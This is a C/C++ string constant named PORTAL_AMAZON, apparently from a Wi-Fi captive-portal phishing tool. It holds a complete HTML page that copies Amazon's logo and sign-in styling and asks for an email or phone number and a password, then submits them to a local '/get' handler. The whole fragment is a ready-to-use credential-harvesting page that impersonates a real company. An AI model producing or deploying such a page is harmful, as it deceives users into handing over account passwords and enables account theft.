const char* PORTAL_AMAZON=R"(
  <!DOCTYPE html>
<html>
<head>
<style>
body {
  font-family: Arial, sans-serif;
}

.container {
  max-width: 400px;
  margin: 0 auto;
  padding: 20px;
}

@media (min-width: 600px) {
  .container {
    max-width: 500px;
  }
}

.logo {
  text-align: center;
  margin-bottom: 30px;
}

.form-container {
  background: #fff;
  border: 1px solid #ddd;
  border-radius: 4px;
  padding: 20px;
  box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.2);
}

h1 {
  text-align: center; 
  font-size: 28px;
  font-weight: 500;
  margin-bottom: 20px;
}

.input-field {
  width: 100%;
  padding: 12px;
  border: 1px solid #ccc; 
  border-radius: 4px;
  box-sizing: border-box;
  margin-bottom: 20px;
  font-size: 14px;
}

.submit-btn {
  background: #f0c14b;
  border: none;
  color: #333;
  padding: 12px 20px;
  border-radius: 4px;
  cursor: pointer;
  font-size: 16px;
}

.submit-btn:hover {
  background: #d8ad40;
}

</style>
</head>

<body>

<div class="container">

  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" viewBox="0 0 120 60">
  <path fill="#f90" d="M72 40.7a38.9 38.9 0 0 1-47.7-3.4c-.5-.5 0-1.2.6-.8a52.8 52.8 0 0 0 46.3 2.8c1-.4 1.8.7.8 1.4m2.5-2.8c-.8-1-5-.4-6.8-.2-.6 0-.7-.4-.2-.8 3.3-2.3 8.8-1.6 9.4-.8s-.1 6.2-3.3 8.8c-.4.4-.9.2-.7-.3.7-1.8 2.3-5.7 1.6-6.7"/>
  <path fill="#221f1f" d="M67.8 20.4v-2.2a.6.6 0 0 1 .6-.6h10.1c.4 0 .6.2.6.6V20c0 .3-.2.8-.7 1.4L73 29.1c2 0 4 .2 5.8 1.2.4.2.5.6.5.9v2.4c0 .3-.3.7-.7.5a11.7 11.7 0 0 0-10.8 0c-.3.2-.7-.1-.7-.5v-2.3c0-.4 0-1 .4-1.5l6.1-8.8h-5.3c-.3 0-.6-.2-.6-.6m-37 14.2h-3.1a.6.6 0 0 1-.6-.5V18c0-.2.3-.5.6-.5h3c.2 0 .5.3.5.6v2c.8-2 2.2-3 4.1-3 2 0 3.2 1 4 3a4.5 4.5 0 0 1 7.9-1.2c1 1.4.8 3.3.8 5v10c0 .3-.3.6-.6.6h-3.1a.6.6 0 0 1-.6-.6V22.6c-.3-1-1-1.3-1.9-1.3-.7 0-1.5.5-1.8 1.3s-.3 2.1-.3 3V34c0 .3-.3.6-.6.6h-3.1a.6.6 0 0 1-.6-.6v-8.4c0-1.8.3-4.4-1.9-4.4-2.2 0-2.1 2.6-2.1 4.4V34c0 .3-.3.6-.6.6m57.2-17.3c4.6 0 7 4 7 9 0 4.8-2.7 8.6-7 8.6-4.5 0-7-3.9-7-8.8 0-5 2.5-8.8 7-8.8m0 3.2c-2.3 0-2.4 3.1-2.4 5s0 6.2 2.4 6.2 2.5-3.4 2.5-5.4c0-1.4 0-3-.5-4.2-.3-1.1-1-1.6-2-1.6m13 14.1h-3a.6.6 0 0 1-.6-.6V18.1c0-.2.3-.5.6-.5h2.9c.2 0 .4.2.5.5v2.4c1-2.2 2.1-3.2 4.3-3.2a4 4 0 0 1 3.6 1.9c.8 1.2.8 3.4.8 5v10c0 .2-.3.4-.6.4h-3.1a.6.6 0 0 1-.5-.5v-8.6c0-1.8.2-4.3-2-4.3-.7 0-1.4.5-1.8 1.3a7 7 0 0 0-.5 3V34c0 .3-.3.6-.6.6M59.7 27c0 1.2 0 2.2-.6 3.3-.5.9-1.3 1.4-2.1 1.4-1.2 0-2-1-2-2.2 0-2.7 2.4-3.2 4.7-3.2v.7m3.1 7.5c-.2.2-.5.2-.7.1-1-.8-1.2-1.2-1.8-2-1.7 1.7-2.9 2.2-5.1 2.2-2.6 0-4.6-1.6-4.6-4.8a5 5 0 0 1 3.3-5c1.7-.8 4-1 5.8-1.1v-.4c0-.8 0-1.7-.4-2.3-.4-.6-1-.8-1.7-.8-1.2 0-2.3.6-2.5 1.9 0 .2-.3.5-.6.5l-3-.3c-.2 0-.5-.2-.4-.6.7-3.7 4-4.8 7-4.8 1.4 0 3.4.4 4.6 1.6C64.2 20 64 21.9 64 24v4.8c0 1.5.6 2.1 1.2 2.9.2.3.2.6 0 .8l-2.4 2M19.1 27c0 1.2 0 2.2-.6 3.3-.5.9-1.2 1.4-2.1 1.4-1.2 0-1.9-.9-1.9-2.2 0-2.7 2.4-3.2 4.6-3.2v.7m3.1 7.6c-.2.1-.5.2-.7 0-1-.8-1.2-1.2-1.8-2-1.7 1.7-2.9 2.2-5 2.2-2.7 0-4.7-1.6-4.7-4.8 0-2.5 1.4-4.2 3.3-5 1.7-.8 4-1 5.8-1.1v-.4c0-.8 0-1.6-.4-2.3-.3-.5-1-.8-1.7-.8-1.2 0-2.2.6-2.5 1.9 0 .3-.2.5-.5.5l-3-.3c-.3 0-.6-.2-.5-.6.7-3.7 4-4.8 7-4.8 1.4 0 3.4.4 4.6 1.6 1.5 1.4 1.4 3.3 1.4 5.3v4.8c0 1.5.6 2.1 1.1 2.9.2.3.3.6 0 .8l-2.3 2"/>
</svg>

  </div>

  <div class="form-container">

      <center><h1>Sign in</h1>
                    <h2>Use your Amazon Account</h2></center>

    <form action="/get" id="login-form">
    
      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
      
      <input name="password" class="input-field" type="password" placeholder="Password" required>
      
      <button class="submit-btn" type="submit">Continue</button>
    
    </form>

  </div>

</div>

</body>
</html>
)";